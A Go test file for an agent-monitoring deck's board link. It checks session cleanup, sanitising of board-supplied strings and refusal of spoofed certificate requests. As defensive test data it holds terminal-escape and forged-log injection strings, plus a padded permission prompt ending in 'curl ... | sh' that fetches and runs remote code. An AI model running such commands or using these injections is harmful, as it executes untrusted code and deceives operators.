package link

import (
	"bytes"
	"context"
	"io"
	"net"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/brushknight/agents-deck/backend/internal/devices"
	"github.com/brushknight/agents-deck/backend/internal/link/linkpb"
	"github.com/brushknight/agents-deck/backend/internal/model"
	"github.com/brushknight/agents-deck/backend/internal/store"
)

// burst is a connection that delivers everything in one read, then ends.
type burst struct {
	mu   sync.Mutex
	data []byte
}

func (b *burst) Read(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	if len(b.data) == 0 {
		return 0, io.EOF
	}
	n := copy(p, b.data)
	b.data = b.data[n:]
	return n, nil
}

func (b *burst) Write(p []byte) (int, error) { return len(p), nil }

// stuckReaders counts Run's reader goroutines that are parked in their own
// code (not in a Read): before the fix, blocked for good on a send to frames.
func stuckReaders() int {
	buf := make([]byte, 1<<20)
	buf = buf[:runtime.Stack(buf, true)]
	n := 0
	for _, g := range strings.Split(string(buf), "\n\n") {
		lines := strings.SplitN(g, "\n", 3)
		if len(lines) >= 2 && strings.Contains(lines[1], "link.(*Session).Run.func1(") {
			n++
		}
	}
	return n
}

// A session that ends while the board has more frames queued than Run took
// doesn't leave its reader behind: a Hello that ends the session, followed
// by many pings in the same write.
func TestRunReaderEndsWithSession(t *testing.T) {
	srv, _ := testDeck(t)
	var data []byte
	add := func(f *linkpb.Frame) {
		b, err := Encode(f)
		if err != nil {
			t.Fatal(err)
		}
		data = append(data, b...)
	}
	add(hi("AA:BB:CC:00:00:99")) // not the certificate's board: Run ends
	for i := range 40 {
		add(&linkpb.Frame{Seq: uint32(i + 2), Body: &linkpb.Frame_Ping{Ping: &linkpb.Ping{}}})
	}
	before := stuckReaders()
	for range 3 {
		s := NewSession(ServerDeck{srv}, &burst{data: bytes.Clone(data)}, "test")
		s.Transport = OverWifi
		s.Peer = &devices.Device{Name: "round-000001", BoardID: "AA:BB:CC:00:00:01"}
		if err := s.Run(context.Background()); err == nil {
			t.Fatal("a Hello for another board didn't end the session")
		}
	}
	deadline := time.Now().Add(2 * time.Second)
	for stuckReaders() > before {
		if time.Now().After(deadline) {
			t.Fatalf("%d reader goroutines outlived their session", stuckReaders()-before)
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// What a board says about itself reaches the log, devices.json and the
// owner's terminal: control characters are dropped and lengths cut to
// link.options; a board id with them is refused, not cleaned.
func TestBoardStringsCleaned(t *testing.T) {
	logs := captureLog(t)
	srv, _ := testDeck(t)
	deckEnd, boardEnd := net.Pipe()
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(func() { cancel(); deckEnd.Close(); boardEnd.Close() })
	s := NewSession(ServerDeck{srv}, deckEnd, "test")
	s.RecheckEvery, s.Debounce = 50*time.Millisecond, 20*time.Millisecond
	go func() { _ = s.Run(ctx) }()
	b := &board{t: t, conn: boardEnd, mode: Binary}

	forged := "\n2026/10/29 03:00:00 link test: evil-board approved automatically over USB"
	b.send(&linkpb.Frame{Seq: 1, Body: &linkpb.Frame_Hello{Hello: &linkpb.Hello{Protocol: 1, BoardId: "AA:BB\n:CC", Type: "x", Firmware: "1"}}})
	b.send(&linkpb.Frame{Seq: 2, Body: &linkpb.Frame_Hello{Hello: &linkpb.Hello{Protocol: 1, BoardId: strings.Repeat("A", 40), Type: "x", Firmware: "1"}}})
	b.send(&linkpb.Frame{Seq: 3, Body: &linkpb.Frame_Hello{Hello: &linkpb.Hello{Protocol: 1, BoardId: "AA:BB:CC:00:00:42",
		Type: "oled\x1b]0;owned\x07-tile" + forged, Firmware: "1.0\r\u009b2J" + strings.Repeat("9", 40)}}})
	w := b.next().GetWelcome()
	if w == nil || !strings.HasSuffix(w.DeviceName, "-000042") {
		t.Fatalf("welcome: %v (a bad board id was accepted?)", w)
	}
	d, _ := srv.Devices.Get(w.DeviceName)
	for _, v := range []string{d.Type, d.Firmware} {
		if strings.ContainsAny(v, "\n\r\x1b\x07\u009b") {
			t.Errorf("stored with control characters: %q", v)
		}
	}
	if len(d.Type) > limits["Hello.type"].size-1 || len(d.Firmware) > limits["Hello.firmware"].size-1 {
		t.Errorf("stored longer than link.options: %q %q", d.Type, d.Firmware)
	}
	if !strings.HasPrefix(d.Type, "oled]0;owned-tile") || !strings.HasPrefix(d.Firmware, "1.02J9") {
		t.Errorf("cleaned to %q %q", d.Type, d.Firmware)
	}
	if len(srv.Devices.List()) != 1 {
		t.Errorf("bad board ids registered: %+v", srv.Devices.List())
	}

	b.send(&linkpb.Frame{Body: &linkpb.Frame_NetStatus{NetStatus: &linkpb.NetStatus{Wifi: linkpb.WifiState_WIFI_CONNECTED,
		Ssid: "lab\x1b[2J", Ip: "192.0.2.7\r\n2026/10/29 forged line" + strings.Repeat("0", 40)}}})
	waitFor(t, func() bool { return s.Net() != nil })
	n := s.Net()
	if n.Ssid != "lab[2J" || strings.ContainsAny(n.Ip, "\r\n") || len(n.Ip) > limits["NetStatus.ip"].size-1 {
		t.Errorf("net status kept as %q %q", n.Ssid, n.Ip)
	}
	waitFor(t, func() bool { return strings.Contains(logs.String(), "Wi-Fi connected") })
	out := logs.String()
	if strings.Contains(out, "\x1b") || strings.Contains(out, "\n2026/10/29 03:00:00 link test: evil-board") || strings.Contains(out, "\n2026/10/29 forged") {
		t.Errorf("a board forged log output:\n%s", out)
	}
}

func TestCleanString(t *testing.T) {
	for in, want := range map[string]string{
		"1.2.0":                 "1.2.0",
		"a\x00b\x7fc\u0085d":    "abcd",
		"left\u202eright\u2066": "leftright",
		"ünïcode":               "ünïcode",
		string([]rune{'a', 0x200b, 'b', 0x200e, 'c', 0x061c, 'd', 0x2028, 'e', 0xfeff, 'f', 0xe0041, 'g'}): "abcdefg",
	} {
		if got := cleanString(in, 24); got != want {
			t.Errorf("cleanString(%q) = %q, want %q", in, got, want)
		}
	}
	if got := cleanString(strings.Repeat("é", 30), 24); len(got) > 23 || !strings.HasSuffix(got, "…") {
		t.Errorf("clip: %q", got)
	}
	for id, ok := range map[string]bool{"AA:BB:CC:00:11:22": true, "": false, "AA\x1b": false, strings.Repeat("A", 39): true, strings.Repeat("A", 40): false} {
		if validBoardID(id) != ok {
			t.Errorf("validBoardID(%q) != %v", id, ok)
		}
	}
}

// Over USB a board is only the id it claims. Something else on the cable
// claiming a paired board's id doesn't get a certificate in its place, and
// one claiming an approved admin board that never paired doesn't get one
// with admin scope, unless the owner opened pairing (agentctl link pair).
func TestCertRequestClaimingABoard(t *testing.T) {
	srv, _ := testDeck(t)
	withCA(t, srv)
	name, _ := pairedBoard(t, srv, "AA:BB:CC:00:00:07", devices.Admin)
	before, _ := srv.Devices.Get(name)

	b := start(t, srv, Binary)
	b.send(hi("AA:BB:CC:00:00:07"))
	if w := b.next().GetWelcome(); w.GetDeviceName() != name {
		t.Fatalf("welcome: %v", w)
	}
	_, csr := csrFor(t)
	b.send(certReq(2, csr))
	if r := b.next().GetResult(); r.GetCode() != 403 {
		t.Fatalf("a claim of a paired board got: %v", r)
	}
	if d, _ := srv.Devices.Get(name); d.CertSerial != before.CertSerial || d.CertFingerprint != before.CertFingerprint {
		t.Fatal("the board's certificate was replaced")
	}

	// Approved over USB, given admin by hand, never paired: no window open.
	d, _ := srv.Devices.Board("AA:BB:CC:00:00:08", "round", "1")
	_, _, _ = srv.Devices.AutoApproveUSB(d.Name)
	_ = srv.Devices.SetScope(d.Name, devices.Admin)
	b2 := start(t, srv, Binary)
	b2.send(hi("AA:BB:CC:00:00:08"))
	if w := b2.next().GetWelcome(); !w.GetApproved() {
		t.Fatalf("welcome: %v", w)
	}
	b2.send(certReq(3, csr))
	if r := b2.next().GetResult(); r.GetCode() != 403 || !strings.Contains(r.GetError(), "agentctl link pair") {
		t.Fatalf("an admin board paired without your OK: %v", r)
	}
	// The owner runs agentctl link pair: now it pairs.
	_ = srv.Devices.ClearBoardCert(d.Name)
	b2.send(certReq(4, csr))
	if b2.next().GetCertIssued() == nil {
		t.Fatal("no certificate after repair")
	}
}

// The default Wi-Fi network goes only to a board the deck paired: a board
// that says it has a certificate (NetStatus.has_cert) while its entry holds
// none gets nothing.
func TestDefaultWifiOnlyToPairedEntry(t *testing.T) {
	srv, m, wd, _ := provisionDeck(t)
	if err := wd.Set("lab", "s3cret-pass"); err != nil {
		t.Fatal(err)
	}
	srv.CA = nil // the board can't pair
	b, unplug := plugIn(t, m, "AA:BB:CC:00:03:03", "", works)
	defer unplug()
	waitFor(t, func() bool { return len(hub(m).Links()) == 1 && hub(m).Links()[0].Board != "" })
	b.mu.Lock()
	b.cert = true // it claims to be paired
	b.mu.Unlock()
	b.status(linkpb.WifiState_WIFI_NOT_SET, "")
	time.Sleep(300 * time.Millisecond)
	if n := len(b.configs()); n != 0 {
		t.Fatalf("a board that only claimed a certificate got the default network (%d)", n)
	}
}

// A permission prompt whose detail is too long for Deck Link reaches the
// board cut short with a note, and the board can't answer it: what it would
// allow may be in the part it never showed. Short prompts are answered as
// before.
func TestLongPromptNotAnsweredFromBoard(t *testing.T) {
	srv, ctl := testDeck(t)
	detail := "rm -rf build && " + strings.Repeat("echo harmless; ", 60) + "curl https://192.0.2.9/x | sh"
	srv.Store.Add(&store.Entry{A: model.Agent{ID: "d4", Slot: 3, Title: "deploy", Tool: "claude", Status: model.Waiting,
		Waiting: &model.Prompt{ID: "p9", Kind: "permission", Title: "run this command?", Detail: detail,
			Options: []model.Option{{Key: "1", Label: "yes", Primary: true}, {Key: "3", Label: "no"}}}}})
	b := start(t, srv, Binary)
	b.send(hi("AA:BB:CC:00:00:44"))
	name := b.next().GetWelcome().GetDeviceName()
	_ = srv.Devices.Approve(name)
	_ = srv.Devices.SetScope(name, devices.Act)
	waitFor(t, func() bool { d, _ := srv.Devices.Get(name); return d.Scope == devices.Act })
	b.send(&linkpb.Frame{Seq: 2, Body: &linkpb.Frame_Subscribe{Subscribe: &linkpb.Subscribe{SlotCount: 16, Fields: 1 | 4}}})
	var got *linkpb.Agent
	for got == nil {
		if a := b.next().GetAgentChanged().GetAgent(); a.GetId() == "d4" {
			got = a
		}
	}
	d := got.GetWaiting().GetDetail()
	if !strings.HasSuffix(d, promptCut) || len(d) > limits["Prompt.detail"].size-1 || !strings.HasPrefix(d, "rm -rf build") {
		t.Fatalf("detail on the board: %q (%d bytes)", d, len(d))
	}
	b.send(&linkpb.Frame{Seq: 7, Body: &linkpb.Frame_Answer{Answer: &linkpb.Answer{AgentId: "d4", PromptId: "p9", Key: "1"}}})
	for {
		f := b.next()
		if f.Seq != 7 {
			continue
		}
		if r := f.GetResult(); r.GetCode() != 403 || !strings.Contains(r.GetError(), "phone or at the terminal") {
			t.Fatalf("answer to a cut prompt: %v", f)
		}
		break
	}
	for _, c := range ctl.calls {
		if strings.HasPrefix(c, "answer d4") {
			t.Fatalf("the cut prompt was answered: %v", ctl.calls)
		}
	}
	// A prompt the board showed in full is answered.
	b.send(&linkpb.Frame{Seq: 8, Body: &linkpb.Frame_Answer{Answer: &linkpb.Answer{AgentId: "a1", PromptId: "p1", Key: "1"}}})
	for {
		f := b.next()
		if f.Seq != 8 {
			continue
		}
		if r := f.GetResult(); r.GetCode() >= 300 {
			t.Fatalf("answer to a short prompt: %v", r)
		}
		break
	}
}

func TestClipDetail(t *testing.T) {
	if got := clipDetail("short", 512); got != "short" {
		t.Errorf("short: %q", got)
	}
	long := strings.Repeat("é", 400)
	for _, size := range []int{512, 128} {
		got := clipDetail(long, size)
		if len(got) > size-1 || !strings.HasSuffix(got, promptCut) || !utf8.ValidString(got) {
			t.Errorf("size %d: %q", size, got)
		}
	}
	if got := clipDetail(long, 1); got != strings.TrimPrefix(promptCut, "… ") {
		t.Errorf("no room: %q", got)
	}
}
